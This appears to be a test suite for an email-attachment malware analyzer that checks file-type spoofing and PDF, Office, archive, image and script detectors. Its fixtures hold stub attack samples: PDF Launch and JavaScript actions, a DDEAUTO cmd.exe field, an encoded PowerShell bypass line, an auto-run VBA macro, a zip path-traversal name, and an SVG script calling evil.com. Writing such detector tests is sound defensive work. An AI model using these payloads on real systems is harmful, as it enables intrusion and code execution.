import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import { detectFileType, checkExtensionMismatch, hasDoubleExtension, hasRtloCharacter } from "../src/services/analysis/payload/file-signatures.js";
import { analyzePdf } from "../src/services/analysis/payload/pdf-analyzer.js";
import { analyzeOfficeDocument } from "../src/services/analysis/payload/office-analyzer.js";
import { analyzeArchive } from "../src/services/analysis/payload/archive-analyzer.js";
import { analyzeImage } from "../src/services/analysis/payload/image-analyzer.js";
import { runYaraRules } from "../src/services/analysis/payload/yara-rules.js";
import { checkFileHash } from "../src/services/analysis/payload/virustotal-file.service.js";
import { scanWithClamAv } from "../src/services/analysis/payload/clamav.service.js";
import { analyzePayloads } from "../src/services/analysis/payload/payload-analyzer.service.js";
import type { RawAttachment } from "../src/types/email.js";

// Helper to create a valid in-memory ZIP buffer with central directory
function createMockZip(entries: Array<{ filename: string; content?: string; encrypted?: boolean }>): Buffer {
  const localHeaders: Buffer[] = [];
  const cdHeaders: Buffer[] = [];
  let offset = 0;

  for (const entry of entries) {
    const data = Buffer.from(entry.content ?? "test data");
    const nameBuf = Buffer.from(entry.filename, "utf8");
    const flags = entry.encrypted ? 1 : 0

    // Local Header
    const lh = Buffer.alloc(30 + nameBuf.length + data.length);
    lh.writeUInt32LE(0x04034b50, 0); // PK\x03\x04
    lh.writeUInt16LE(20, 4); // version
    lh.writeUInt16LE(flags, 6); // flags
    lh.writeUInt16LE(0, 8); // compression = stored
    lh.writeUInt16LE(0, 10); // time
    lh.writeUInt16LE(0, 12); // date
    lh.writeUInt32LE(0x12345678, 14); // crc
    lh.writeUInt32LE(data.length, 18); // comp size
    lh.writeUInt32LE(data.length, 22); // uncomp size
    lh.writeUInt16LE(nameBuf.length, 26); // name len
    lh.writeUInt16LE(0, 28); // extra len
    nameBuf.copy(lh, 30);
    data.copy(lh, 30 + nameBuf.length);

    localHeaders.push(lh);

    // Central Directory Header
    const cdh = Buffer.alloc(46 + nameBuf.length);
    cdh.writeUInt32LE(0x02014b50, 0); // PK\x01\x02
    cdh.writeUInt16LE(20, 4); // version made by
    cdh.writeUInt16LE(20, 6); // version needed
    cdh.writeUInt16LE(flags, 8); // flags
    cdh.writeUInt16LE(0, 10); // compression
    cdh.writeUInt16LE(0, 12); // time
    cdh.writeUInt16LE(0, 14); // date
    cdh.writeUInt32LE(0x12345678, 16); // crc
    cdh.writeUInt32LE(data.length, 20); // comp size
    cdh.writeUInt32LE(data.length, 24); // uncomp size
    cdh.writeUInt16LE(nameBuf.length, 28); // name len
    cdh.writeUInt16LE(0, 30); // extra len
    cdh.writeUInt16LE(0, 32); // comment len
    cdh.writeUInt16LE(0, 34); // disk num
    cdh.writeUInt16LE(0, 36); // internal attr
    cdh.writeUInt32LE(0, 38); // external attr
    cdh.writeUInt32LE(offset, 42); // local header offset
    nameBuf.copy(cdh, 46);

    cdHeaders.push(cdh);
    offset += lh.length;
  }

  const cdBuf = Buffer.concat(cdHeaders);
  const cdOffset = offset;

  // End of Central Directory
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // PK\x05\x06
  eocd.writeUInt16LE(0, 4); // disk number
  eocd.writeUInt16LE(0, 6); // start disk
  eocd.writeUInt16LE(entries.length, 8); // entries on disk
  eocd.writeUInt16LE(entries.length, 10); // total entries
  eocd.writeUInt32LE(cdBuf.length, 12); // cd size
  eocd.writeUInt32LE(cdOffset, 16); // cd offset
  eocd.writeUInt16LE(0, 20); // comment len

  return Buffer.concat([...localHeaders, cdBuf, eocd]);
}

describe("Payload Analysis Suite", () => {
  describe("File Signatures & Type Detection", () => {
    it("identifies PDF magic bytes", () => {
      const pdf = Buffer.from("%PDF-1.7\n%stream");
      const res = detectFileType(pdf);
      expect(res.detectedType).toBe("application/pdf");
      expect(res.detectedExtension).toBe(".pdf");
    });

    it("identifies ZIP magic bytes", () => {
      const zip = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x00, 0x00]);
      const res = detectFileType(zip);
      expect(res.detectedType).toBe("application/zip");
      expect(res.detectedExtension).toBe(".zip");
    });

    it("identifies PE Windows executable magic bytes", () => {
      const pe = Buffer.from([0x4d, 0x5a, 0x90, 0x00]);
      const res = detectFileType(pe);
      expect(res.detectedType).toBe("application/x-msdownload");
      expect(res.detectedExtension).toBe(".exe");
    });

    it("identifies PNG, JPEG, GIF, and SVG formats", () => {
      const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      expect(detectFileType(png).detectedType).toBe("image/png");

      const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0]);
      expect(detectFileType(jpeg).detectedType).toBe("image/jpeg");

      const gif = Buffer.from("GIF89a...");
      expect(detectFileType(gif).detectedType).toBe("image/gif");

      const svg = Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'></svg>");
      expect(detectFileType(svg).detectedType).toBe("image/svg+xml");
    });

    it("detects extension spoofing and double extensions", () => {
      const mismatch = checkExtensionMismatch("invoice.pdf", "application/x-msdownload");
      expect(mismatch.mismatch).toBe(true);
      expect(mismatch.declaredExt).toBe(".pdf");
      expect(mismatch.expectedExt).toBe(".exe");

      // Valid OOXML inside zip
      const validDocx = checkExtensionMismatch("report.docx", "application/zip");
      expect(validDocx.mismatch).toBe(false);

      expect(hasDoubleExtension("invoice.pdf.exe")).toBe(true);
      expect(hasDoubleExtension("annual_report.final.pdf")).toBe(false);
      expect(hasRtloCharacter("test\u202Efdp.exe")).toBe(true);
    });
  });

  describe("PDF Analyzer", () => {
    it("detects JavaScript, Launch actions, forms, and extracts URLs", () => {
      const samplePdf = Buffer.from(
        "%PDF-1.4\n" +
        "1 0 obj <</Title (Confidential Memo) /Author (Finance) /CreationDate (D:20260901)>> endobj\n" +
        "2 0 obj <</Type /Action /S /JavaScript /JS (app.alert('malware'))>> endobj\n" +
        "3 0 obj <</Type /Action /S /Launch /F (cmd.exe)>> endobj\n" +
        "4 0 obj <</Type /Action /S /URI /URI (https://phish.target.com/login)>> endobj\n" +
        "5 0 obj <</Type /Catalog /OpenAction 2 0 R /AcroForm 10 0 R>> endobj\n" +
        "trailer <</Root 5 0 R>>\n%%EOF"
      );

      const result = analyzePdf(samplePdf);
      expect(result.hasJavaScript).toBe(true);
      expect(result.hasLaunchAction).toBe(true);
      expect(result.hasAutoAction).toBe(true);
      expect(result.title).toBe("Confidential Memo");
      expect(result.author).toBe("Finance");
      expect(result.extractedUrls).toContain("https://phish.target.com/login");
      expect(result.indicators.some((i) => i.rule === "PDF_LAUNCH" && i.severity === "CRITICAL")).toBe(true);
      expect(result.indicators.some((i) => i.rule === "PDF_JS" && i.severity === "HIGH")).toBe(true);
    });
  });

  describe("Office Analyzer", () => {
    it("detects VBA macros and external relationships in OOXML", () => {
      const mockDocx = createMockZip([
        { filename: "[Content_Types].xml", content: "<Types></Types>" },
        { filename: "docProps/core.xml", content: "<coreProperties></coreProperties>" },
        { filename: "word/vbaProject.bin", content: "macro binary data" },
        { filename: "word/_rels/document.xml.rels", content: '<Relationships><Relationship Target="http://evil.com/template.dotm" TargetMode="External"/></Relationships>' },
      ]);

      const result = analyzeOfficeDocument(mockDocx, "application/zip");
      expect(result.hasMacros).toBe(true);
      expect(result.hasExternalRelationships).toBe(true);
      expect(result.externalUrls).toContain("http://evil.com/template.dotm");
      expect(result.indicators.some((i) => i.rule === "OFFICE_MACRO" && i.severity === "CRITICAL")).toBe(true);
    });

    it("detects VBA macros in legacy OLE2 CFBF documents", () => {
      const oleHeader = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
      const oleBody = Buffer.from("Root Entry\0_VBA_PROJECT_CUR\0VBA\0Macros\0");
      const mockDoc = Buffer.concat([oleHeader, oleBody]);

      const result = analyzeOfficeDocument(mockDoc, "application/vnd.ms-office");
      expect(result.hasMacros).toBe(true);
      expect(result.indicators.some((i) => i.rule === "OFFICE_MACRO")).toBe(true);
    });

    it("detects DDE links", () => {
      const buffer = Buffer.from("PK\x03\x04... <w:fldSimple w:instr=\"DDEAUTO C:\\\\Windows\\\\System32\\\\cmd.exe\">");
      const result = analyzeOfficeDocument(buffer, "application/zip");
      expect(result.hasDdeLinks).toBe(true);
      expect(result.indicators.some((i) => i.rule === "OFFICE_DDE")).toBe(true);
    });
  });

  describe("Archive Analyzer", () => {
    it("lists archive entries, flags executables, encrypted entries, and nested archives", () => {
      const archive = createMockZip([
        { filename: "invoice.pdf", content: "safe content" },
        { filename: "setup.exe", content: "mz header..." },
        { filename: "secret.docx", content: "encrypted", encrypted: true },
        { filename: "nested.zip", content: "zip inside" },
      ]);

      const result = analyzeArchive(archive);
      expect(result.totalEntries).toBe(4);
      expect(result.entries.find((e) => e.filename === "setup.exe")?.isExecutable).toBe(true);
      expect(result.entries.find((e) => e.filename === "secret.docx")?.isEncrypted).toBe(true);
      expect(result.entries.find((e) => e.filename === "nested.zip")?.isArchive).toBe(true);
      expect(result.indicators.some((i) => i.rule === "ARCHIVE_EXECUTABLE" && i.severity === "HIGH")).toBe(true);
      expect(result.indicators.some((i) => i.rule === "ARCHIVE_ENCRYPTED" && i.severity === "MEDIUM")).toBe(true);
    });

    it("detects path traversal attempts in archive filenames", () => {
      const archive = createMockZip([
        { filename: "../../etc/passwd", content: "root:x:0:0" },
      ]);

      const result = analyzeArchive(archive);
      expect(result.hasPathTraversal).toBe(true);
      expect(result.indicators.some((i) => i.rule === "ARCHIVE_PATH_TRAVERSAL" && i.severity === "CRITICAL")).toBe(true);
    });
  });

  describe("Image Analyzer", () => {
    it("extracts dimensions and flags appended data beyond EOF for PNG", () => {
      // Create minimal PNG: 8 bytes sig + IHDR chunk (13 bytes data + 4 bytes type + 4 bytes length + 4 bytes crc = 25 bytes)
      const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const ihdr = Buffer.alloc(25);
      ihdr.writeUInt32BE(13, 0); // length
      ihdr.write("IHDR", 4);
      ihdr.writeUInt32BE(800, 8); // width = 800
      ihdr.writeUInt32BE(600, 12); // height = 600
      const iend = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]);
      const maliciousPayload = Buffer.from("EVIL_APPENDED_SCRIPT_HERE");

      const png = Buffer.concat([pngHeader, ihdr, iend, maliciousPayload]);
      const result = analyzeImage(png, "image/png");

      expect(result.width).toBe(800);
      expect(result.height).toBe(600);
      expect(result.hasAppendedData).toBe(true);
      expect(result.indicators.some((i) => i.rule === "IMAGE_APPENDED_DATA")).toBe(true);
    });

    it("detects scripts and dangerous tags inside SVG images", () => {
      const evilSvg = Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('http://evil.com')</script></svg>");
      const result = analyzeImage(evilSvg, "image/svg+xml");
      expect(result.hasScript).toBe(true);
      expect(result.indicators.some((i) => i.rule === "IMAGE_SCRIPT" && i.severity === "HIGH")).toBe(true);
    });
  });

  describe("YARA Rules Pattern Engine", () => {
    it("matches PowerShell execution commands", () => {
      const psPayload = Buffer.from("powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA");
      const matches = runYaraRules(psPayload, "script.bat");
      expect(matches.some((m) => m.rule === "SUSPICIOUS_POWERSHELL" && m.severity === "HIGH")).toBe(true);
    });

    it("matches auto-executing VBA macro triggers", () => {
      const vbaCode = Buffer.from("Sub Document_Open()\nShell(\"calc.exe\")\nEnd Sub");
      const matches = runYaraRules(vbaCode, "invoice.docm");
      expect(matches.some((m) => m.rule === "VBA_MACRO_AUTOEXEC")).toBe(true);
    });

    it("matches obfuscated script patterns", () => {
      const obfuscated = Buffer.from("var x = String.fromCharCode(65, 66, 67); eval(x);");
      const matches = runYaraRules(obfuscated, "payload.js");
      expect(matches.some((m) => m.rule === "SUSPICIOUS_SCRIPT_OBFUSCATION")).toBe(true);
    });

    it("matches embedded executable in non-executable file", () => {
      const disguisedPe = Buffer.from("MZ\x90\x00\x03\x00\x00\x00... This program cannot be run in DOS mode.");
      const matches = runYaraRules(disguisedPe, "statement.pdf");
      expect(matches.some((m) => m.rule === "EXECUTABLE_IN_DOCUMENT" && m.severity === "CRITICAL")).toBe(true);
    });
  });

  describe("VirusTotal & ClamAV Services", () => {
    beforeEach(() => {
      vi.restoreAllMocks();
    });

    it("returns clean ClamAV unavailable status when host not configured", async () => {
      const res = await scanWithClamAv(Buffer.from("clean test"));
      expect(res.available).toBe(false);
      expect(res.status).toBe("unavailable");
    });

    it("handles VirusTotal hash hit with malicious detections", async () => {
      const fakeSha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
      const originalFetch = globalThis.fetch;
      globalThis.fetch = vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => ({
          data: {
            attributes: {
              last_analysis_stats: { malicious: 12, suspicious: 2, undetected: 50, harmless: 10 },
            },
          },
        }),
      } as any);

      try {
        const res = await checkFileHash(fakeSha256);
        expect(res.found).toBe(true);
        expect(res.malicious).toBe(12);
        expect(res.suspicious).toBe(2);
        expect(res.permalink).toContain(fakeSha256);
      } finally {
        globalThis.fetch = originalFetch;
      }
    });

    it("handles VirusTotal 404 hash miss gracefully", async () => {
      const fakeSha256 = "0000000000000000000000000000000000000000000000000000000000000000";
      const originalFetch = globalThis.fetch;
      globalThis.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 404,
      } as any);

      try {
        const res = await checkFileHash(fakeSha256);
        expect(res.checked).toBe(true);
        expect(res.found).toBe(false);
        expect(res.malicious).toBe(0);
      } finally {
        globalThis.fetch = originalFetch;
      }
    });
  });

  describe("Full Payload Analyzer Pipeline", () => {
    it("evaluates clean attachments with NO_THREAT_FOUND verdict", async () => {
      const cleanAttachment: RawAttachment = {
        filename: "notes.txt",
        contentType: "text/plain",
        size: 26,
        content: Buffer.from("Meeting notes from Monday."),
        sha256: "abc1234567890123456789012345678901234567890123456789012345678901",
        sha1: "abc1234567890123456789012345678901234567",
        md5: "abc12345678901234567890123456789",
      };

      const result = await analyzePayloads([cleanAttachment]);
      expect(result.payloadAnalysis).toHaveLength(1);
      expect(result.payloadAnalysis[0]?.verdict).toBe("NO_THREAT_FOUND");
    });

    it("evaluates malicious PDF with JavaScript & Launch actions as MALICIOUS", async () => {
      const maliciousPdfContent = Buffer.from(
        "%PDF-1.4\n1 0 obj <</Type /Action /S /JavaScript /JS (app.alert(1))>> endobj\n" +
        "2 0 obj <</Type /Action /S /Launch /F (cmd.exe)>> endobj\n" +
        "trailer <</Root 1 0 R>>\n%%EOF"
      );

      const maliciousPdf: RawAttachment = {
        filename: "urgent_invoice.pdf",
        contentType: "application/pdf",
        size: maliciousPdfContent.length,
        content: maliciousPdfContent,
        sha256: "def1234567890123456789012345678901234567890123456789012345678901",
        sha1: "def1234567890123456789012345678901234567",
        md5: "def12345678901234567890123456789",
      };

      const result = await analyzePayloads([maliciousPdf]);
      expect(result.payloadAnalysis[0]?.verdict).toBe("MALICIOUS");
      expect(result.findings.length).toBeGreaterThan(0);
      expect(result.findings.some((f) => f.severity === "CRITICAL")).toBe(true);
    });

    it("flags PE executable disguised as PDF with extension mismatch as SUSPICIOUS or MALICIOUS", async () => {
      const disguisedExeContent = Buffer.from("MZ\x90\x00\x03\x00This program cannot be run in DOS mode.");
      const disguisedAttachment: RawAttachment = {
        filename: "invoice.pdf",
        contentType: "application/pdf",
        size: disguisedExeContent.length,
        content: disguisedExeContent,
        sha256: "fff1234567890123456789012345678901234567890123456789012345678901",
        sha1: "fff1234567890123456789012345678901234567",
        md5: "fff12345678901234567890123456789",
      };

      const result = await analyzePayloads([disguisedAttachment]);
      expect(result.payloadAnalysis[0]?.extensionMismatch).toBe(true);
      expect(["SUSPICIOUS", "MALICIOUS"]).toContain(result.payloadAnalysis[0]?.verdict);
    });

    it("extracts destination URLs from payload documents", async () => {
      const pdfWithLink = Buffer.from(
        "%PDF-1.4\n1 0 obj <</Type /Action /S /URI /URI (https://phish.target.com/verify)>> endobj\n%%EOF"
      );

      const attachment: RawAttachment = {
        filename: "document.pdf",
        contentType: "application/pdf",
        size: pdfWithLink.length,
        content: pdfWithLink,
        sha256: "1111234567890123456789012345678901234567890123456789012345678901",
        sha1: "1111234567890123456789012345678901234567",
        md5: "11112345678901234567890123456789",
      };

      const result = await analyzePayloads([attachment]);
      expect(result.extractedUrls).toContain("https://phish.target.com/verify");
    });
  });
});
